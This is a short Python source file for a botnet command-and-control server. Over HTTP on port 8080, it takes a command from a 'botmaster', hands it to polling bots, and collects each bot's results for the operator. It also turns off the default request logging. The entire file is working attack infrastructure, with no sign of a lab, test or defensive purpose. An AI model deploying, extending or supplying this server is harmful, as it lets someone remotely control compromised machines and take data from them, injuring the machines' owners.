#!/usr/bin/env python3
import json
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

HOST = "0.0.0.0"
PORT = 8080

current_command: dict = {"cmd": None}
results: list         = []


class C2Handler(BaseHTTPRequestHandler):

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        try:
            body = json.loads(self.rfile.read(length))
        except json.JSONDecodeError:
            self._respond(400, "Bad JSON")
            return

        if self.path == "/command":
            current_command["cmd"] = body.get("cmd")
            results.clear()
            self._respond(200, "ok")
            print(f"- New command from botmaster: {current_command['cmd']}")

        elif self.path == "/result":
            entry = {"bot_id": body.get("bot_id"), "result": body.get("result", "")}
            results.append(entry)
            self._respond(200, "ok")
            preview = entry["result"].splitlines()[0][:60] if entry["result"] else ""
            print(f"- Result from {entry['bot_id']}: {preview}")

        else:
            self._respond(404, "Not found")

    def do_GET(self):
        if self.path == "/command":
            self._respond(200, json.dumps(current_command))

        elif self.path == "/results":
            self._respond(200, json.dumps(results))

        else:
            self._respond(404, "Not found")

    def _respond(self, code: int, body: str) -> None:
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, fmt, *args):
        pass  # suppress default per-request access log


def main() -> None:
    server = HTTPServer((HOST, PORT), C2Handler)
    print(f"- C2 Server listening on {HOST}:{PORT}")
    print(f"- Waiting for botmaster commands and bot results...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n- Shutting down.")
        server.server_close()


if __name__ == "__main__":
    main()
